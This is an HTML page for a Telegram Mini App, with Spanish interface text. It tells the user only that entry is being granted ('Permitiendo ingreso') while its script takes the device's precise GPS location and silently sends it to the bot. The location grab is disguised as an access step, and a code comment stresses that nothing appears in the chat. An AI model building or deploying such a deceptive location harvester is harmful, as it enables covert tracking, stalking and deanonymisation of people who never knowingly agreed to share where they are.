<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, maximum-scale=1, user-scalable=no">
<title>Anonymous</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
  :root { --bg:#0b0f0c; --fg:#d7f5de; --muted:#7f9a87; --accent:#3ddc84; --err:#ff6b6b; --card:#121a14; --line:#1f2d23; }
  * { box-sizing: border-box; }
  html, body { margin:0; height:100%; background:var(--bg); color:var(--fg);
    font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
  main { min-height:100%; display:flex; flex-direction:column; align-items:center; justify-content:center;
    gap:14px; padding:24px 16px calc(24px + env(safe-area-inset-bottom)); text-align:center; }
  h1 { margin:0; font-size:22px; font-weight:600; letter-spacing:.2px; }
  h1.err { color:var(--err); }
  p { margin:0; max-width:320px; color:var(--muted); font-size:15px; line-height:1.45; }
  .acciones { display:none; flex-direction:column; gap:10px; width:100%; max-width:320px; margin-top:6px; }
  button { appearance:none; border:0; border-radius:12px; padding:14px 16px; font-size:16px; font-weight:600;
    background:var(--accent); color:#04210f; cursor:pointer; }
  button.sec { background:var(--card); color:var(--fg); border:1px solid var(--line); }
  button:active { transform:scale(.98); }
</style>
</head>
<body>
<main>
  <h1 id="titulo">Permitiendo ingreso</h1>
  <p id="texto" style="display:none"></p>
  <div class="acciones" id="acciones">
    <button id="btnReintentar">Reintentar</button>
    <button id="btnAjustes" class="sec" style="display:none">Abrir ajustes</button>
    <button id="btnCerrar" class="sec">Cerrar</button>
  </div>
</main>

<script>
(function () {
  var tg = window.Telegram && window.Telegram.WebApp;
  var $ = function (id) { return document.getElementById(id); };
  var enviado = false;
  var intento = 0;
  var FRASE = "Permitiendo ingreso";

  if (tg) {
    try { tg.ready(); tg.expand(); } catch (e) {}
    try { tg.setHeaderColor("#0b0f0c"); tg.setBackgroundColor("#0b0f0c"); } catch (e) {}
  }

  // Normal (buscando / enviado): solo se ve la frase. Solo si falla algo se muestra el motivo y los botones.
  function normal() {
    $("titulo").className = "";
    $("titulo").textContent = FRASE;
    $("texto").style.display = "none";
    $("acciones").style.display = "none";
  }

  function error(titulo, texto, conAjustes) {
    $("titulo").className = "err";
    $("titulo").textContent = titulo;
    $("texto").textContent = texto;
    $("texto").style.display = "block";
    $("acciones").style.display = "flex";
    $("btnAjustes").style.display = conAjustes ? "block" : "none";
  }

  function enviar(lat, lon, precision) {
    if (enviado) return;
    if (typeof lat !== "number" || typeof lon !== "number" || isNaN(lat) || isNaN(lon)) {
      return error("No se pudo permitir el ingreso", "Inténtalo de nuevo.", false);
    }
    enviado = true;
    normal();
    var carga = JSON.stringify({
      tipo: "ubicacion",
      lat: Math.round(lat * 1e6) / 1e6,
      lon: Math.round(lon * 1e6) / 1e6,
      precision: Math.round(precision || 0)
    });
    // sendData cierra la pantalla y entrega los datos al bot sin escribir nada en el chat.
    setTimeout(function () { try { tg.sendData(carga); } catch (e) { enviado = false; error("No se pudo permitir el ingreso", "Cierra e inténtalo de nuevo desde el botón del bot.", false); } }, 400);
  }

  function viaNavegador(miIntento) {
    if (!navigator.geolocation) {
      return error("No se pudo permitir el ingreso", "Este dispositivo no es compatible.", false);
    }
    navigator.geolocation.getCurrentPosition(function (p) {
      if (miIntento !== intento) return;
      enviar(p.coords.latitude, p.coords.longitude, p.coords.accuracy);
    }, function (err) {
      if (miIntento !== intento) return;
      if (err && err.code === 1) {
        error("Ingreso bloqueado", "Acepta el permiso de Telegram y toca «Reintentar».", !!(tg && tg.LocationManager));
      } else {
        error("No se pudo permitir el ingreso", "Toca «Reintentar».", false);
      }
    }, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
  }

  function viaTelegram(miIntento) {
    var LM = tg && tg.LocationManager;
    if (!LM) return viaNavegador(miIntento);
    var respondio = false;
    // Si el administrador de ubicación de Telegram no responde, se usa el del navegador.
    var plan_b = setTimeout(function () { if (!respondio && miIntento === intento) viaNavegador(miIntento); }, 8000);
    LM.init(function () {
      if (miIntento !== intento) return;
      if (LM.isLocationAvailable === false) { respondio = true; clearTimeout(plan_b); return viaNavegador(miIntento); }
      LM.getLocation(function (loc) {
        respondio = true; clearTimeout(plan_b);
        if (miIntento !== intento) return;
        if (loc) {
          enviar(loc.latitude, loc.longitude, loc.horizontal_accuracy);
        } else {
          error("Ingreso bloqueado", "Acepta el permiso de Telegram y toca «Reintentar».", true);
        }
      });
    });
  }

  function iniciar() {
    intento += 1;
    var mio = intento;
    normal();
    if (!tg || !tg.platform || tg.platform === "unknown") {
      return error("Ábrelo desde el bot", "Esta pantalla solo funciona desde el botón del bot en Telegram.", false);
    }
    var nuevo = false;
    try { nuevo = tg.isVersionAtLeast && tg.isVersionAtLeast("8.0"); } catch (e) {}
    if (nuevo) viaTelegram(mio); else viaNavegador(mio);
  }

  $("btnReintentar").onclick = iniciar;
  $("btnCerrar").onclick = function () { try { tg.close(); } catch (e) { window.close(); } };
  $("btnAjustes").onclick = function () { try { tg.LocationManager.openSettings(); } catch (e) {} };

  iniciar();
})();
</script>
</body>
</html>
